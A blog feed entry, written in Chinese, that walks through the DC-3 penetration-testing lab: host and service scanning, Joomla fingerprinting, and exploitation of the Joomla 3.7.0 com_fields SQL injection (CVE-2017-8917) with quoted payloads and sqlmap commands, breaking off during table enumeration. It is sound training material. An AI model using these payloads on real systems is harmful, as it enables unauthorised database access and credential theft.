<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>记录成为更好的自己</title>
  
  <subtitle>对酒当歌，人生几何？</subtitle>
  <link href="https://lunamoore.github.io/atom.xml" rel="self"/>
  
  <link href="https://lunamoore.github.io/"/>
  <updated>2020-08-22T06:48:14.456Z</updated>
  <id>https://lunamoore.github.io/</id>
  
  <author>
    <name>Lluna</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>DC:3</title>
    <link href="https://lunamoore.github.io/2020/08/22/DC-3/"/>
    <id>https://lunamoore.github.io/2020/08/22/DC-3/</id>
    <published>2020-08-22T06:30:15.000Z</published>
    <updated>2020-08-22T06:48:14.456Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-官网描述"><a href="#0x00-官网描述" class="headerlink" title="0x00.官网描述"></a>0x00.官网描述</h2><blockquote><p>DC-3 is another purposely built vulnerable lab with the intent of gaining experience in the world of penetration testing.</p><p>As with the previous DC releases, this one is designed with beginners in mind, although this time around, there is only one flag, one entry point and no clues at all.</p><p>Linux skills and familiarity with the Linux command line are a must, as is some experience with basic penetration testing tools.</p><p>For beginners, Google can be of great assistance, but you can always tweet me at @DCAU7 for assistance to get you going again. But take note: I won’t give you the answer, instead, I’ll give you an idea about how to move forward.</p><p>For those with experience doing CTF and Boot2Root challenges, this probably won’t take you long at all (in fact, it could take you less than 20 minutes easily).</p><p>If that’s the case, and if you want it to be a bit more of a challenge, you can always redo the challenge and explore other ways of gaining root and obtaining the flag.</p><p><strong>DC-3之后不再有提示信息，只有一个最终flag</strong></p></blockquote><a id="more"></a><h2 id="0x01-老规矩上nmap"><a href="#0x01-老规矩上nmap" class="headerlink" title="0x01.老规矩上nmap"></a>0x01.老规矩上nmap</h2><p><code>可以发现1为网关，2为宿主机，6为kali，那么5就是我们的受害者</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">root@JIYE:~/tmp/DC3<span class="comment"># nmap -sP 192.168.1.0/24 -oN nmap.sP</span></span><br><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2020-08-21 20:53 EDT</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.1.1</span><br><span class="line">Host is up (0.0021s latency).</span><br><span class="line">MAC Address: 68:D1:BA:1F:FD:48 (Shenzhen Youhua Technology)</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.1.2</span><br><span class="line">Host is up (0.00033s latency).</span><br><span class="line">MAC Address: 50:5B:C2:8C:BE:A5 (Liteon Technology)</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.1.5</span><br><span class="line">Host is up (0.00026s latency).</span><br><span class="line">MAC Address: 00:0C:29:63:7B:83 (VMware)</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.1.6</span><br><span class="line">Host is up.</span><br><span class="line">Nmap <span class="keyword">done</span>: 256 IP addresses (4 hosts up) scanned <span class="keyword">in</span> 2.09 seconds</span><br><span class="line">root@JIYE:~/tmp/DC3<span class="comment"># </span></span><br></pre></td></tr></table></figure><p><strong>附加：使用netdiscover也可以</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">root@JIYE:~/tmp/DC3<span class="comment"># netdiscover</span></span><br><span class="line"> Currently scanning: 192.168.21.0/16   |   Screen View: Unique Hosts                 </span><br><span class="line"> 8 Captured ARP Req/Rep packets, from 3 hosts.   Total size: 480                     </span><br><span class="line"> _____________________________________________________________________________</span><br><span class="line">   IP            At MAC Address     Count     Len  MAC Vendor / Hostname      </span><br><span class="line"> -----------------------------------------------------------------------------</span><br><span class="line"> 192.168.1.2     50:5b:c2:8c:be:a5      6     360  Liteon Technology Corporation     </span><br><span class="line"> 192.168.1.1     68:d1:ba:1f:fd:48      1      60  Shenzhen YOUHUA Technology Co., Ltd</span><br><span class="line"> 192.168.1.5     00:0c:29:63:7b:83      1      60  VMware, Inc.                   </span><br></pre></td></tr></table></figure><h2 id="0x02-继续nmap扫描服务及端口"><a href="#0x02-继续nmap扫描服务及端口" class="headerlink" title="0x02.继续nmap扫描服务及端口"></a>0x02.继续nmap扫描服务及端口</h2><p><code>发现子开放了80端口</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">root@JIYE:~/tmp/DC3<span class="comment"># nmap -A 192.168.1.5 -p 1-65535 -oN nmap.A</span></span><br><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2020-08-21 21:02 EDT</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.1.5</span><br><span class="line">Host is up (0.00051s latency).</span><br><span class="line">Not shown: 65534 closed ports</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))</span><br><span class="line">|_http-generator: Joomla! - Open Source Content Management</span><br><span class="line">|_http-server-header: Apache/2.4.18 (Ubuntu)</span><br><span class="line">|_http-title: Home</span><br><span class="line">MAC Address: 00:0C:29:63:7B:83 (VMware)</span><br><span class="line">Device <span class="built_in">type</span>: general purpose</span><br><span class="line">Running: Linux 3.X|4.X</span><br><span class="line">OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4</span><br><span class="line">OS details: Linux 3.2 - 4.9</span><br><span class="line">Network Distance: 1 hop</span><br><span class="line"></span><br><span class="line">TRACEROUTE</span><br><span class="line">HOP RTT     ADDRESS</span><br><span class="line">1   0.51 ms 192.168.1.5</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 10.28 seconds</span><br><span class="line">root@JIYE:~/tmp/DC3<span class="comment">#</span></span><br></pre></td></tr></table></figure><h2 id="0x03-访问80端口"><a href="#0x03-访问80端口" class="headerlink" title="0x03.访问80端口"></a>0x03.访问80端口</h2><p><code>根据提示，这次只有一个flag，需要获得root权限</code></p><img src="/2020/08/22/DC-3/image-20200822090518505.png" class><p><code>没有什么其他有用的信息，下面使用whatweb进行指纹识别</code></p><h2 id="0x04-指纹识别"><a href="#0x04-指纹识别" class="headerlink" title="0x04.指纹识别"></a>0x04.指纹识别</h2><p><code>发现为apache，ubuntu，Joomla(cms)</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@JIYE:~/tmp/DC3<span class="comment"># whatweb http://192.168.1.5</span></span><br><span class="line">http://192.168.1.5 [200 OK] Apache[2.4.18], Bootstrap, Cookies[460ada11b31d3c5e5ca6e58fd5d3de27], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.18 (Ubuntu)], HttpOnly[460ada11b31d3c5e5ca6e58fd5d3de27], IP[192.168.1.5], JQuery, MetaGenerator[Joomla! - Open Source Content Management], PasswordField[password], Script[application/json], Title[Home]</span><br><span class="line">root@JIYE:~/tmp/DC3<span class="comment"># </span></span><br></pre></td></tr></table></figure><h2 id="0x05-使用joomscan扫描"><a href="#0x05-使用joomscan扫描" class="headerlink" title="0x05.使用joomscan扫描"></a>0x05.使用joomscan扫描</h2><p><code>发现没有防火墙，Joomla版本为3.7.0，4个目录列表，与网站后台</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">root@JIYE:~/tmp/DC3<span class="comment"># joomscan -u http://192.168.1.5</span></span><br><span class="line"> (_  _)(  _  )(  _  )(  \/  )/ __) / __)  /__\  ( \( )</span><br><span class="line">  .-_)(   )(_)(  )(_)(  )    ( \__ \( (__  /(__)\  )  ( </span><br><span class="line">  \____) (_____)(_____)(_/\/\_)(___/ \___)(__)(__)(_)\_)</span><br><span class="line">                        (1337.today)</span><br><span class="line">   </span><br><span class="line">    --=[OWASP JoomScan</span><br><span class="line">    +---++---==[Version : 0.0.7</span><br><span class="line">    +---++---==[Update Date : [2018/09/23]</span><br><span class="line">    +---++---==[Authors : Mohammad Reza Espargham , Ali Razmjoo</span><br><span class="line">    --=[Code name : Self Challenge</span><br><span class="line">    @OWASP_JoomScan , @rezesp , @Ali_Razmjo0 , @OWASP</span><br><span class="line"></span><br><span class="line">Processing http://192.168.1.5 ...</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[+] FireWall Detector</span><br><span class="line">[++] Firewall not detected</span><br><span class="line"></span><br><span class="line">[+] Detecting Joomla Version</span><br><span class="line">[++] Joomla 3.7.0</span><br><span class="line"></span><br><span class="line">[+] Core Joomla Vulnerability</span><br><span class="line">[++] Target Joomla core is not vulnerable</span><br><span class="line"></span><br><span class="line">[+] Checking Directory Listing</span><br><span class="line">[++] directory has directory listing : </span><br><span class="line">http://192.168.1.5/administrator/components</span><br><span class="line">http://192.168.1.5/administrator/modules</span><br><span class="line">http://192.168.1.5/administrator/templates</span><br><span class="line">http://192.168.1.5/images/banners</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[+] Checking apache info/status files</span><br><span class="line">[++] Readable info/status files are not found</span><br><span class="line"></span><br><span class="line">[+] admin finder</span><br><span class="line">[++] Admin page : http://192.168.1.5/administrator/</span><br><span class="line"></span><br><span class="line">[+] Checking robots.txt existing</span><br><span class="line">[++] robots.txt is not found</span><br><span class="line"></span><br><span class="line">[+] Finding common backup files name</span><br><span class="line">[++] Backup files are not found</span><br><span class="line"></span><br><span class="line">[+] Finding common <span class="built_in">log</span> files name</span><br><span class="line">[++] error <span class="built_in">log</span> is not found</span><br><span class="line"></span><br><span class="line">[+] Checking sensitive config.php.x file</span><br><span class="line">[++] Readable config files are not found</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Your Report : reports/192.168.1.5/</span><br><span class="line">root@JIYE:~/tmp/DC3<span class="comment">#</span></span><br></pre></td></tr></table></figure><h2 id="0x06-爬一下目录列表"><a href="#0x06-爬一下目录列表" class="headerlink" title="0x06.爬一下目录列表"></a>0x06.爬一下目录列表</h2><p><strong>没有什么有用的信息，图就不放了。。。</strong></p><h2 id="0x07-访问后台"><a href="#0x07-访问后台" class="headerlink" title="0x07.访问后台"></a>0x07.访问后台</h2><p><code>也没有发现什么可用的信息，可以爆破，但爆破是最后的挣扎，先查一下Joomla 3.7.0有没有漏洞</code></p><img src="/2020/08/22/DC-3/image-20200822092304133.png" class><h2 id="0x08-查找Joomla漏洞"><a href="#0x08-查找Joomla漏洞" class="headerlink" title="0x08.查找Joomla漏洞"></a>0x08.查找Joomla漏洞</h2><p><code>发现存在sql注入</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">root@JIYE:~/tmp/DC3<span class="comment"># searchsploit joomla 3.7.0</span></span><br><span class="line">----------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------</span><br><span class="line"> Exploit Title                                                                                                                           |  Path</span><br><span class="line">----------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------</span><br><span class="line">Joomla! 3.7.0 - <span class="string">&#x27;com_fields&#x27;</span> SQL Injection                                                                                               | php/webapps/42033.txt</span><br><span class="line">Joomla! Component Easydiscuss &lt; 4.0.21 - Cross-Site Scripting                                                                            | php/webapps/43488.txt</span><br><span class="line">----------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------</span><br><span class="line">Shellcodes: No Results</span><br><span class="line">root@JIYE:~/tmp/DC3<span class="comment"># </span></span><br></pre></td></tr></table></figure><h2 id="0x09-查看sqli说明"><a href="#0x09-查看sqli说明" class="headerlink" title="0x09.查看sqli说明"></a>0x09.查看sqli说明</h2><blockquote><p>CVE : - CVE-2017-8917</p><p>注入点：<span class="exturl" data-url="aHR0cDovL2xvY2FsaG9zdC9pbmRleC5waHA/b3B0aW9uPWNvbV9maWVsZHMmYW1wO3ZpZXc9ZmllbGRzJmFtcDtsYXlvdXQ9bW9kYWwmYW1wO2xpc3QlNUJmdWxsb3JkZXJpbmclNUQ=">http://localhost/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]<i class="fa fa-external-link-alt"></i></span></p><p>=updatexml%27</p><p>可以使用sqlmap进行利用</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">root@JIYE:~/tmp/DC3<span class="comment">#  cp /usr/share/exploitdb/exploits/php/webapps/42033.txt joomla_v3.7.0_sqli.txt</span></span><br><span class="line">root@JIYE:~/tmp/DC3<span class="comment"># cat joomla_v3.7.0_sqli.txt </span></span><br><span class="line"><span class="comment"># Exploit Title: Joomla 3.7.0 - Sql Injection</span></span><br><span class="line"><span class="comment"># Date: 05-19-2017</span></span><br><span class="line"><span class="comment"># Exploit Author: Mateus Lino</span></span><br><span class="line"><span class="comment"># Reference: https://blog.sucuri.net/2017/05/sql-injection-vulnerability-joomla-3-7.html</span></span><br><span class="line"><span class="comment"># Vendor Homepage: https://www.joomla.org/</span></span><br><span class="line"><span class="comment"># Version: = 3.7.0</span></span><br><span class="line"><span class="comment"># Tested on: Win, Kali Linux x64, Ubuntu, Manjaro and Arch Linux</span></span><br><span class="line"><span class="comment"># CVE : - CVE-2017-8917</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">URL Vulnerable: http://localhost/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml%27</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Using Sqlmap: </span><br><span class="line"></span><br><span class="line">sqlmap -u <span class="string">&quot;http://localhost/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&quot;</span> --risk=3 --level=5 --random-agent --dbs -p list[fullordering]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Parameter: list[fullordering] (GET)</span><br><span class="line">    Type: boolean-based blind</span><br><span class="line">    Title: Boolean-based blind - Parameter replace (DUAL)</span><br><span class="line">    Payload: option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=(CASE WHEN (1573=1573) THEN 1573 ELSE 1573*(SELECT 1573 FROM DUAL UNION SELECT 9674 FROM DUAL) END)</span><br><span class="line"></span><br><span class="line">    Type: error-based</span><br><span class="line">    Title: MySQL &gt;= 5.0 error-based - Parameter replace (FLOOR)</span><br><span class="line">    Payload: option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=(SELECT 6600 FROM(SELECT COUNT(*),CONCAT(0x7171767071,(SELECT (ELT(6600=6600,1))),0x716a707671,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)</span><br><span class="line"></span><br><span class="line">    Type: AND/OR time-based blind</span><br><span class="line">    Title: MySQL &gt;= 5.0.12 time-based blind - Parameter replace (substraction)</span><br><span class="line">    Payload: option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=(SELECT * FROM (SELECT(SLEEP(5)))GDiu)root@JIYE:~/tmp/DC3<span class="comment"># </span></span><br><span class="line">root@JIYE:~/tmp/DC3<span class="comment"># </span></span><br></pre></td></tr></table></figure><h2 id="0x10-sqlmap利用"><a href="#0x10-sqlmap利用" class="headerlink" title="0x10.sqlmap利用"></a>0x10.sqlmap利用</h2><h3 id="1-爆库"><a href="#1-爆库" class="headerlink" title="1.爆库"></a>1.爆库</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">root@JIYE:~/tmp/DC3<span class="comment"># sqlmap -u &quot;http://192.168.1.5/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&quot; --risk=3 --level=5 --random-agent --dbs -p list[fullordering]</span></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line">[21:42:32] [INFO] the back-end DBMS is MySQL</span><br><span class="line">back-end DBMS: MySQL &gt;= 5.1</span><br><span class="line">[21:42:32] [INFO] fetching database names</span><br><span class="line">[21:42:32] [INFO] retrieved: <span class="string">&#x27;information_schema&#x27;</span></span><br><span class="line">[21:42:32] [INFO] retrieved: <span class="string">&#x27;joomladb&#x27;</span></span><br><span class="line">[21:42:32] [INFO] retrieved: <span class="string">&#x27;mysql&#x27;</span></span><br><span class="line">[21:42:32] [INFO] retrieved: <span class="string">&#x27;performance_schema&#x27;</span></span><br><span class="line">[21:42:32] [INFO] retrieved: <span class="string">&#x27;sys&#x27;</span></span><br><span class="line">available databases [5]:</span><br><span class="line">[*] information_schema</span><br><span class="line">[*] joomladb</span><br><span class="line">[*] mysql</span><br><span class="line">[*] performance_schema</span><br><span class="line">[*] sys</span><br><span class="line"></span><br><span class="line">[21:42:32] [WARNING] HTTP error codes detected during run:</span><br><span class="line">500 (Internal Server Error) - 2670 <span class="built_in">times</span></span><br><span class="line">[21:42:32] [INFO] fetched data logged to text files under <span class="string">&#x27;/root/.local/share/sqlmap/output/192.168.1.5&#x27;</span></span><br><span class="line"></span><br><span class="line">[*] ending @ 21:42:32 /2020-08-21/</span><br><span class="line"></span><br><span class="line">root@JIYE:~/tmp/DC3<span class="comment">#</span></span><br></pre></td></tr></table></figure><h3 id="2-查看当前数据库"><a href="#2-查看当前数据库" class="headerlink" title="2.查看当前数据库"></a>2.查看当前数据库</h3><p><code>当前数据库名字为joomladb</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">root@JIYE:~/tmp/DC3<span class="comment"># sqlmap -u &quot;http://192.168.1.5/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&quot; --risk=3 --level=5 --random-agent --current-db -p list[fullordering]       </span></span><br><span class="line">        ___</span><br><span class="line">       __H__</span><br><span class="line"> ___ ___[<span class="string">&quot;]_____ ___ ___  &#123;1.4.8#stable&#125;</span></span><br><span class="line"><span class="string">|_ -| . [&#x27;]     | .&#x27;| . |</span></span><br><span class="line"><span class="string">|___|_  [&#x27;]_|_|_|__,|  _|</span></span><br><span class="line"><span class="string">      |_|V...       |_|   http://sqlmap.org</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user&#x27;s responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[*] starting @ 21:51:56 /2020-08-21/</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[21:51:56] [INFO] fetched random HTTP User-Agent header value &#x27;Mozilla/5.0 (Macintosh; U; PPC Mac OS X; sv-se) AppleWebKit/523.12.2 (KHTML, like Gecko) Version/3.0.4 Safari/523.12.2&#x27; from file &#x27;/usr/share/sqlmap/data/txt/user-agents.txt&#x27;</span></span><br><span class="line"><span class="string">[21:51:56] [INFO] resuming back-end DBMS &#x27;mysql&#x27; </span></span><br><span class="line"><span class="string">[21:51:56] [INFO] testing connection to the target URL</span></span><br><span class="line"><span class="string">[21:51:56] [WARNING] the web server responded with an HTTP error code (500) which could interfere with the results of the tests</span></span><br><span class="line"><span class="string">you have not declared cookie(s), while server wants to set its own (&#x27;460ada11b31d3c5e5ca6e58fd5d3de27=k3m9bafm9dg...dg5cjc6tq0&#x27;). Do you want to use those [Y/n] </span></span><br><span class="line"><span class="string">sqlmap resumed the following injection point(s) from stored session:</span></span><br><span class="line"><span class="string">---</span></span><br><span class="line"><span class="string">Parameter: list[fullordering] (GET)</span></span><br><span class="line"><span class="string">    Type: error-based</span></span><br><span class="line"><span class="string">    Title: MySQL &gt;= 5.1 error-based - Parameter replace (UPDATEXML)</span></span><br><span class="line"><span class="string">    Payload: option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=(UPDATEXML(8495,CONCAT(0x2e,0x7170786b71,(SELECT (ELT(8495=8495,1))),0x7170786b71),8473))</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Type: time-based blind</span></span><br><span class="line"><span class="string">    Title: MySQL &gt;= 5.0.12 time-based blind - Parameter replace (substraction)</span></span><br><span class="line"><span class="string">    Payload: option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=(SELECT 8890 FROM (SELECT(SLEEP(5)))cGDb)</span></span><br><span class="line"><span class="string">---</span></span><br><span class="line"><span class="string">[21:51:59] [INFO] the back-end DBMS is MySQL</span></span><br><span class="line"><span class="string">back-end DBMS: MySQL &gt;= 5.1</span></span><br><span class="line"><span class="string">[21:51:59] [INFO] fetching current database</span></span><br><span class="line"><span class="string">[21:51:59] [INFO] retrieved: &#x27;joomladb&#x27;</span></span><br><span class="line"><span class="string">current database: &#x27;joomladb&#x27;</span></span><br><span class="line"><span class="string">[21:51:59] [WARNING] HTTP error codes detected during run:</span></span><br><span class="line"><span class="string">500 (Internal Server Error) - 2 times</span></span><br><span class="line"><span class="string">[21:51:59] [INFO] fetched data logged to text files under &#x27;/root/.local/share/sqlmap/output/192.168.1.5&#x27;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[*] ending @ 21:51:59 /2020-08-21/</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">root@JIYE:~/tmp/DC3# </span></span><br></pre></td></tr></table></figure><h3 id="3-爆表"><a href="#3-爆表" class="headerlink" title="3.爆表"></a>3.爆表</h3><p><code>定位到#__user表</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><span class="line">root@JIYE:~/tmp/DC3<span class="comment"># sqlmap -u &quot;http://192.168.1.5/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&quot; --risk=3 --level=5 --random-agent -D joomladb --tables -p list[fullordering] </span></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line">Database: joomladb</span><br><span class="line">[76 tables]</span><br><span class="line">+---------------------+</span><br><span class="line">| <span class="comment">#__assets           |</span></span><br><span class="line">| <span class="comment">#__associations     |</span></span><br><span class="line">| <span class="comment">#__banner_clients   |</span></span><br><span class="line">| <span class="comment">#__banner_tracks    |</span></span><br><span class="line">| <span class="comment">#__banners          |</span></span><br><span class="line">| <span class="comment">#__bsms_admin       |</span></span><br><span class="line">| <span class="comment">#__bsms_books       |</span></span><br><span class="line">| <span class="comment">#__bsms_comments    |</span></span><br><span class="line">| <span class="comment">#__bsms_locations   |</span></span><br><span class="line">| <span class="comment">#__bsms_mediafiles  |</span></span><br><span class="line">| <span class="comment">#__bsms_message_typ |</span></span><br><span class="line">| <span class="comment">#__bsms_podcast     |</span></span><br><span class="line">| <span class="comment">#__bsms_series      |</span></span><br><span class="line">| <span class="comment">#__bsms_servers     |</span></span><br><span class="line">| <span class="comment">#__bsms_studies     |</span></span><br><span class="line">| <span class="comment">#__bsms_studytopics |</span></span><br><span class="line">| <span class="comment">#__bsms_teachers    |</span></span><br><span class="line">| <span class="comment">#__bsms_templatecod |</span></span><br><span class="line">| <span class="comment">#__bsms_templates   |</span></span><br><span class="line">| <span class="comment">#__bsms_timeset     